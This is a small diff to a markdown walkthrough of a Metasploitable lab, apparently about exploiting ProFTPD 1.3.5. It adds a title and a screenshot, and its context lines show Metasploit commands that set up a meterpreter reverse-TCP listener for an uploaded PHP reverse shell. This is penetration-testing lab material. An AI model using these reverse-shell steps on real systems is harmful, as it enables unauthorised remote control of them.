@@ -6,7 +6,7 @@ tags: "Metasploitable Series"
 ---
 
 # Metasploitable Series
-## Issue 1
+## Issue 1 : ProFTPD 1.3.5
 
 ![Nmap Scan](/images/nmap-scan1.png)
 
@@ -41,6 +41,10 @@ we need to upload the reverse shell php and have a listener set up to capture th
 - set Lport 4444
 - set payload windows/meterpreter/reverse_tcp
 - run
+
+
+![Listener](/images/listener.png)
+
 
 2. Creating reverse shell using msfvenom
 
